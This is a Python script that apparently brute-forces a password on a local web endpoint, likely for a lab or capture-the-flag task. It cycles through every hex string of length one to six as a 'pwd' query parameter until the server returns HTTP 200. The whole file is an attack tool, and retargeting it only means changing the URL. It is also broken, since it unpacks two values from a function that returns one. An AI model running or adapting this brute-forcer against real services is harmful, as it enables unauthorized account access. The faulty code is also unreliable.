import requests

characters = '0123456789abcdef'

url = 'http://127.0.0.1:3001/secret?pwd='  # Replace with the actual URL

# Function to make a request with a given password
def make_request(password):    
    return requests.get(url + password).status_code

# Iterate through all possible password lengths (1 to 6)
for password_length in range(1, 7):
    # Generate all possible passwords with the given length
    for i in range(len(characters) ** password_length):
        password = ''
        index = i
        for _ in range(password_length):
            password += characters[index % len(characters)]
            index //= len(characters)
        
        status_code, response_text = make_request(password)

        # Check if the status code is 200 (success)
        if status_code == 200:
            print(f"Password found: {password}")
            print(f"Server response: {response_text}")
            break
        elif status_code == 403:
            print(f"Attempted password: {password} - Forbidden")
        else:
            print(f"Attempted password: {password} - Unknown status code: {status_code}")

    # Check if the correct password was found
    if status_code == 200:
        break
